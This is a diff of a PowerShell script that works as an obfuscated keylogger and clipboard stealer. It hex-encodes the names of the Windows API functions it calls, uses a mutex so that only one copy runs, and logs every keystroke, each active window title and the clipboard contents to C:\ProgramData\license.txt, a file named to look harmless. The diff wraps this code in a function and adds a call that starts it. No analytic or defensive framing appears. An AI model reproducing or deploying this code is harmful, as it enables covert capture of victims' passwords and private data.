@@ -1,100 +1,111 @@
-$idx = '[DllImport("user32.dll",CharSet=CharSet.Auto)]'
-$ida =  "public static extern"
-$idq = "System.Text.StringBuilder"
-
-$asy = "47 65 74 41 73 79 6e 63 4b 65 79 53 74 61 74 65"
-$key = "47 65 74 4b 65 79 62 6f 61 72 64 53 74 61 74 65"
-$Map = "4d 61 70 56 69 72 74 75 61 6c 4b 65 79"
-$Fore = "47 65 74 46 6f 72 65 67 72 6f 75 6e 64 57 69 6e 64 6f 77"
-$window = "47 65 74 57 69 6e 64 6f 77 54 65 78 74"
-$code = "54 6f 55 6e 69 63 6f 64 65"
-$number = "47 65 74 43 6c 69 70 62 6f 61 72 64 53 65 71 75 65 6e 63 65 4e 75 6d 62 65 72"
-$clip = "49 73 43 6c 69 70 62 6f 61 72 64 46 6f 72 6d 61 74 41 76 61 69 6c 61 62 6c 65"
-$count = "47 65 74 54 69 63 6b 43 6f 75 6e 74"
-
-$ll = ($asy -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$lll = ($key -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$llll = ($Map -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$lllll = ($Fore -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$llllll = ($window -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$lllllll = ($code -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$llllllll = ($number -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$lllllllll = ($clip -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-$llllllllll = ($count -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-
-$ab_clk = 'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;public class CLK{[DllImport("user32.dll",CharSet=CharSet.Auto,ExactSpelling=true)]' + $ida + ' short ' + $ll + '(int virtualKeyCode);' + $idx + '' + $ida + ' int ' + $lll + '(byte[] keystate);' + $idx + '' + $ida + ' int ' + $llll + '(uint uCode,int uMapType);' + $idx + '' + $ida + ' int ' + $lllll + '();' + $idx + '' + $ida + ' int ' + $llllll + '(int hwnd,' + $idq + ' lpText,int cchLength);' + $idx + '' + $ida + ' int ' + $lllllll + '(uint wVirtKey,uint wScanCode,byte[] lpkeystate,' + $idq + ' pwszBuff,int cchBuff,uint wFlags);[DllImport("user32.dll")]' + $ida + ' int ' + $llllllll + '();[DllImport("user32.dll")]' + $ida + ' bool ' + $lllllllll + '(uint uFormat);[DllImport("kernel32.dll")]' + $ida + ' UInt32 ' + $llllllllll + '();}'
-Add-Type -TypeDefinition $ab_clk 
-Add-Type -Assembly PresentationCore
-$b_Mute = $true
-
-#뮤텍스 설정 
-$kj = "47 6c 6f 62 61 6c 5c 41 6c 72 65 61 64 79 52 75 6e 6e 69 6e 67 31 39 31 32 32 33 34 35"
-$str_Mute = ($kj -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
-try{
-	$curMute = [System.Threading.Mutex]::OpenExisting($str_Mute)
-	$b_Mute = $false
-}catch{
-	$newMute = New-Object System.Threading.Mutex($true,$str_Mute)
-}
-$clk_k = [CLK]  
-$enc = [System.Text.Encoding]::UTF8
-$byte_a = New-Object Byte[] 256	
-$str_Builder = New-Object -TypeName System.Text.StringBuilder
-$cur_W = New-Object System.Text.StringBuilder(260)
-
-$hex_asc = @(0x09,  0x27,   0x2E,    0x08,   0x24,     0x1b,    0x25,   0x01,   0x20, 0x2d,    0x26,  0x11,     0x28,  0x23,    0x02)
-$ascii_str = @("Tab", "[->]", "[Del]", "[Bk]", "[Home]", "[Esc]", "[<-]", "[LM]", " ",  "[Ser]", "[^]", "[Ctrl]", "[v]", "[End]", "[RM]")
-$tf = "MM-dd:HH:mm"
-$old_W = ""
-$old_T = 0
-$old_c = 0
-$up_T = 0
+function StartMain()
+{
+	Param(
+		[Parameter(Mandatory=$True)]
+		[string]$Path
+	)
 
 
-while($b_Mute){
-	$curTick = $clk_k::($llllllllll)()
+	$idx = '[DllImport("user32.dll",CharSet=CharSet.Auto)]'
+	$ida =  "public static extern"
+	$idq = "System.Text.StringBuilder"
 	
-	$hTopWnd = $clk_k::($lllll)()
-	$len = $clk_k::($llllll)($hTopWnd, $cur_W, $cur_W.Capacity)
-	if($cur_W.ToString() -ne $old_W){
-		$old_W = $cur_W.ToString()
-		$t = Get-Date -Format $tf
-		[System.IO.File]::AppendAllText($Path, "`n===== [" + $t + "] [" + $cur_W.ToString() + "] =====`n",$enc)	
-	}
+	$asy = "47 65 74 41 73 79 6e 63 4b 65 79 53 74 61 74 65"
+	$key = "47 65 74 4b 65 79 62 6f 61 72 64 53 74 61 74 65"
+	$Map = "4d 61 70 56 69 72 74 75 61 6c 4b 65 79"
+	$Fore = "47 65 74 46 6f 72 65 67 72 6f 75 6e 64 57 69 6e 64 6f 77"
+	$window = "47 65 74 57 69 6e 64 6f 77 54 65 78 74"
+	$code = "54 6f 55 6e 69 63 6f 64 65"
+	$number = "47 65 74 43 6c 69 70 62 6f 61 72 64 53 65 71 75 65 6e 63 65 4e 75 6d 62 65 72"
+	$clip = "49 73 43 6c 69 70 62 6f 61 72 64 46 6f 72 6d 61 74 41 76 61 69 6c 61 62 6c 65"
+	$count = "47 65 74 54 69 63 6b 43 6f 75 6e 74"
+	
+	$ll = ($asy -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$lll = ($key -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$llll = ($Map -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$lllll = ($Fore -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$llllll = ($window -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$lllllll = ($code -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$llllllll = ($number -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$lllllllll = ($clip -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	$llllllllll = ($count -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
 
-	if(($old_T -eq 0) -or (($curTick - $old_T) -gt 1000)){
-		$old_T = $curTick
-		$curClip = $clk_k::($llllllll)()
-		if($old_c -ne $curClip){
-			$old_c = $curClip
-			if($clk_k::($lllllllll)(1)){
-				[System.IO.File]::AppendAllText($Path, "`n===== [Clipboard] =====`n" + [Windows.Clipboard]::GetText() + $enc)
-			}
+	$ab_clk = 'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;public class CLK{[DllImport("user32.dll",CharSet=CharSet.Auto,ExactSpelling=true)]' + $ida + ' short ' + $ll + '(int virtualKeyCode);' + $idx + '' + $ida + ' int ' + $lll + '(byte[] keystate);' + $idx + '' + $ida + ' int ' + $llll + '(uint uCode,int uMapType);' + $idx + '' + $ida + ' int ' + $lllll + '();' + $idx + '' + $ida + ' int ' + $llllll + '(int hwnd,' + $idq + ' lpText,int cchLength);' + $idx + '' + $ida + ' int ' + $lllllll + '(uint wVirtKey,uint wScanCode,byte[] lpkeystate,' + $idq + ' pwszBuff,int cchBuff,uint wFlags);[DllImport("user32.dll")]' + $ida + ' int ' + $llllllll + '();[DllImport("user32.dll")]' + $ida + ' bool ' + $lllllllll + '(uint uFormat);[DllImport("kernel32.dll")]' + $ida + ' UInt32 ' + $llllllllll + '();}'
+	Add-Type -TypeDefinition $ab_clk 
+	Add-Type -Assembly PresentationCore
+	$b_Mute = $true
+	
+	#뮤텍스 설정 
+	$kj = "47 6c 6f 62 61 6c 5c 41 6c 72 65 61 64 79 52 75 6e 6e 69 6e 67 31 39 31 32 32 33 34 35"
+	$str_Mute = ($kj -split ' ' | ForEach-Object { [char][int]::Parse($_, 'HexNumber') }) -join ''
+	try{
+		$curMute = [System.Threading.Mutex]::OpenExisting($str_Mute)
+		$b_Mute = $false
+	}catch{
+		$newMute = New-Object System.Threading.Mutex($true,$str_Mute)
+	}
+	$clk_k = [CLK]  
+	$enc = [System.Text.Encoding]::UTF8
+	$byte_a = New-Object Byte[] 256	
+	$str_Builder = New-Object -TypeName System.Text.StringBuilder
+	$cur_W = New-Object System.Text.StringBuilder(260)
+
+	$hex_asc = @(0x09,  0x27,   0x2E,    0x08,   0x24,     0x1b,    0x25,   0x01,   0x20, 0x2d,    0x26,  0x11,     0x28,  0x23,    0x02)
+	$ascii_str = @("Tab", "[->]", "[Del]", "[Bk]", "[Home]", "[Esc]", "[<-]", "[LM]", " ",  "[Ser]", "[^]", "[Ctrl]", "[v]", "[End]", "[RM]")
+	$tf = "MM-dd:HH:mm"
+	$old_W = ""
+	$old_T = 0
+	$old_c = 0
+	$up_T = 0
+	
+
+	while($b_Mute){
+		$curTick = $clk_k::($llllllllll)()
+		
+		$hTopWnd = $clk_k::($lllll)()
+		$len = $clk_k::($llllll)($hTopWnd, $cur_W, $cur_W.Capacity)
+		if($cur_W.ToString() -ne $old_W){
+			$old_W = $cur_W.ToString()
+			$t = Get-Date -Format $tf
+			[System.IO.File]::AppendAllText($Path, "`n===== [" + $t + "] [" + $cur_W.ToString() + "] =====`n",$enc)	
 		}
-	}
-	
-	$k = ""
-	for($val = 0; $val -le 254; $val++){
-		$vals = -12345 - 20422;
-		if($clk_k::($ll)($val) -ne $vals) {continue}			
-		$null = [console]::CapsLock		
-		$vals = 45 - 14;
-		if($val -gt $vals){
-			$vKey = $clk_k::($llll)($val, (8 - 5))
-			$ret = $clk_k::($lll)($byte_a)
-			if($clk_k::($lllllll)($val, $vKey, $byte_a, $str_Builder, $str_Builder.Capacity, 0) -gt 0){
-				$k += $str_Builder.ToString()
-			}						
-		}else{
-			for($i = 0; $i -le (19-5); $i++){
-				if($val -eq $hex_asc[$i]){
-					$k += $ascii_str[$i]
-					break
+
+		if(($old_T -eq 0) -or (($curTick - $old_T) -gt 1000)){
+			$old_T = $curTick
+			$curClip = $clk_k::($llllllll)()
+			if($old_c -ne $curClip){
+				$old_c = $curClip
+				if($clk_k::($lllllllll)(1)){
+					[System.IO.File]::AppendAllText($Path, "`n===== [Clipboard] =====`n" + [Windows.Clipboard]::GetText() + $enc)
 				}
 			}
-		}					
-	}
-	if($k.Length -gt 0){
-		[System.IO.File]::AppendAllText($Path, $k, $enc)
+		}
+		
+		$k = ""
+		for($val = 0; $val -le 254; $val++){
+			$vals = -12345 - 20422;
+			if($clk_k::($ll)($val) -ne $vals) {continue}			
+			$null = [console]::CapsLock		
+			$vals = 45 - 14;
+			if($val -gt $vals){
+				$vKey = $clk_k::($llll)($val, (8 - 5))
+				$ret = $clk_k::($lll)($byte_a)
+				if($clk_k::($lllllll)($val, $vKey, $byte_a, $str_Builder, $str_Builder.Capacity, 0) -gt 0){
+					$k += $str_Builder.ToString()
+				}						
+			}else{
+				for($i = 0; $i -le (19-5); $i++){
+					if($val -eq $hex_asc[$i]){
+						$k += $ascii_str[$i]
+						break
+					}
+				}
+			}					
+		}
+		if($k.Length -gt 0){
+			[System.IO.File]::AppendAllText($Path, $k, $enc)
+		}
 	}
 }
+
+StartMain -Path "C:\ProgramData\license.txt"
